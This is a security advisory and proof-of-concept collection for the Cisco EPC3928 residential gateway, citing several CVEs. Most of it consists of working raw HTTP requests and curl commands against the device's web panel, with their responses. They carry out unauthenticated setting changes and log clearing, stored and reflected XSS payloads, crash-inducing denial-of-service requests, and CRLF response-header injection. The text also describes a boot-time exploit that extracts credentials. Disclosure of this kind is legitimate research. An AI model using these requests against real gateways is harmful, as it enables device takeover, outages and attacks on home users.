@@ -1,0 +1,296 @@
+﻿# Title: Cisco EPC 3928 Multiple Vulnerabilities
+# Vendor: http://www.cisco.com/
+# Vulnerable Version(s): Cisco Model EPC3928 DOCSIS 3.0 8x4 Wireless Residential Gateway
+# CVE References: CVE-2015-6401 / CVE-2015-6402 / CVE-2016-1328 / CVE-2016-1336 / CVE-2016-1337
+# Author: Patryk Bogdan from Secorda security team (http://secorda.com/)
+
+========
+
+Summary:
+In recent security research, Secorda security team has found multiple vulnerabilities affecting Cisco EPC3928 Wireless Residential Gateway. Variants of this product can also be affected.
+Using combination of several vulnerabilities, attacker is able to remotely download and decode boot configuration file, which you can see on PoC video below. The attacker is also able to reconfigure device in order to perform attacks on the home-user, inject additional data to modem http response or extract sensitive informations from the device, such as the Wi-Fi key.
+
+Until Cisco releases workarounds or patches, we recommend verify access to the web-based management panel and make sure that it is not reachable from the external network.
+
+Vulnerabilities:
+1) Unauthorized Command Execution
+2) Gateway Stored XSS
+3) Gateway Client List DoS
+4) Gateway Reflective XSS
+5) Gateway HTTP Corruption DoS
+6) "Stored" HTTP Response Injection
+7) Boot Information Disclosure
+
+========
+
+PoC:
+
+- Unathorized Command Execution
+
+#1 - Channel selection request:
+POST /goform/ChannelsSelection HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/ChannelsSelection.asp
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 24
+
+SAHappyUpstreamChannel=3
+
+#1 - Response:
+HTTP/1.0 200 OK
+Server: PS HTTP Server
+Content-type: text/html
+Connection: close
+
+<html lang="en"><head><title>RELOAD</title><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /><script language="javascript" type="text/javascript" src="../active.js"></script><script language="javascript" type="text/javascript" src="../lang.js"></script><script language="javascript" type="text/javascript">var totaltime=120;function time(){document.formnow.hh.value=(" "+totaltime+" Seconds ");totaltime--;} function refreshStatus(){window.setTimeout("window.parent.location.href='http://192.168.1.1'",totaltime*1000);}mytime=setInterval('time()',1000);</script></head><body BGCOLOR="#CCCCCC" TEXT=black><form name="formnow"><HR><h1><script language="javascript" type="text/javascript">dw(msg_goform34);</script><a href="http://192.168.1.1/index.asp"><script language="javascript" type="text/javascript">dw(msg_goform35);</script></a><script language="javascript">refreshStatus();</script><input type="text" name="hh" style="background-color:#CCCCCC;font-size:36;border:none"></h1></form></body></html>
+
+#2 - Clear logs request:
+POST /goform/Docsis_log HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/Docsis_log.asp
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+BtnClearLog=Clear+Log&SnmpClearEventLog=0
+
+#2 - Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.1.1/Docsis_log.asp
+Content-type: text/html
+Connection: close
+
+
+
+- Gateway Stored and Reflective Cross Site Scripting
+
+Example #1:
+
+#1 – Stored XSS via username change request:
+POST /goform/Administration HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/Administration.asp
+Cookie: Lang=en; SessionID=2719880
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 165
+
+working_mode=0&sysname=<script>alert('XSS')</script>&sysPasswd=home&sysConfirmPasswd=home&save=Save+Settings&preWorkingMode=1&h_wlan_enable=enable&h_user_type=common
+
+#1 – Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: http://192.168.1.1/Administration.asp
+Content-type: text/html
+Connection: close
+
+
+#2 – Redirect request:
+GET /Administration.asp HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/Administration.asp
+Cookie: Lang=en; SessionID=2719880
+DNT: 1
+Connection: keep-alive
+
+#2 – Response:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 15832
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html lang="en">
+<head>
+(...)
+<tr>
+<td>
+<script language="javascript" type="text/javascript">dw(usertype);</script>
+</td>
+<td nowrap>
+<script>alert('XSS')</script>
+</TD>
+</tr>
+<tr>
+(...)
+
+
+Example #2:
+
+#1 – Reflected XSS via client list request:
+POST /goform/WClientMACList HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: 192.168.1.1/WClientMACList.asp
+Cookie: Lang=en; SessionID=109660
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+
+sortWireless=mac&h_sortWireless=mac" onmouseover=alert(1) x="y
+
+#1 – Response:
+HTTP/1.0 302 Redirect
+Server: PS HTTP Server
+Location: 192.168.1.1/WClientMACList.asp
+Content-type: text/html
+Connection: close
+#2 – Redirect request:
+GET /WClientMACList.asp HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: 192.168.1.1/WClientMACList.asp
+Cookie: Lang=en; SessionID=109660
+Connection: keep-alive
+
+#2 – Reponse:
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 7385
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html lang="en">
+<head>
+(...)
+</table>
+</div>
+<input type="hidden" name="h_sortWireless" value="mac" onmouseover=alert(1) x="y" />
+</form>
+</body>
+</html>
+(...)
+
+
+
+- Gateway Client List Denial of Service
+
+Device will crash after sending following request.
+
+# HTTP Request
+POST /goform/WClientMACList HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/WClientMACList.asp
+Cookie: Lang=en; SessionID=109660
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+
+sortWireless=mac&h_sortWireless=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+
+
+
+- Gateway HTTP Corruption Denial of Service
+
+Device will crash after sending following request.
+
+# HTTP Request
+POST /goform/Docsis_system HTTP/1.1
+Host: 192.168.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:18.0) Gecko/20100101 Firefox/18.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.1/Docsis_system.asp
+Cookie: Lang=en; SessionID=348080
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 106
+
+username_login=&password_login=&LanguageSelect=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&Language_Submit=0&login=Log+In
+
+
+
+- "Stored" HTTP Response Injection
+
+It is able to inject additional HTTP data to response, if string parameter of LanguageSelect won't be too long (in that case device will crash).
+Additional data will be stored in device memory and returned with every http response on port 80 until reboot.
+
+devil@hell:~$ curl -gi http://192.168.1.1/ -s | head -10
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Content-Length: 1469
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html lang="en">
+
+devil@hell:~$ curl --data "username_login=&password_login=&LanguageSelect=en%0d%0aSet-Cookie: w00t&Language_Submit=0&login=Log+In" http://192.168.1.1/goform/Docsis_system -s > /dev/null
+
+devil@hell:~$ curl -gi http://192.168.1.1/ -s | head -10
+HTTP/1.1 200 OK
+Content-type: text/html
+Expires: Thu, 3 Oct 1968 12:00:00 GMT
+Pragma: no-cache
+Cache-Control: no-cache, must-revalidate
+Connection: close
+Set-Cookie: Lang=en
+Set-Cookie: w00t
+Set-Cookie: SessionID=657670
+Content-Length: 1469
+
+
+
+- Boot Information Disclosure
+
+In early booting phase, for a short period of time some administrator functions can be executed, and it is able to extract device configuration file. We wrote an exploit that crash the modem, and then retrieve and decode config in order to obtain users credentials.
+
+Exploit video PoC: https://www.youtube.com/watch?v=PHSx0s7Turo
+
+
+========
+
+CVE References:
+CVE-2015-6401
+CVE-2015-6402
+CVE-2016-1328
+CVE-2016-1336
+CVE-2016-1337
+
+Cisco Bug ID’s:
+CSCux24935
+CSCux24938
+CSCux24941
+CSCux24948
+CSCuy28100
+CSCux17178
+
+Read more on our blog:
+http://secorda.com/multiple-security-vulnerabilities-affecting-cisco-epc3928/
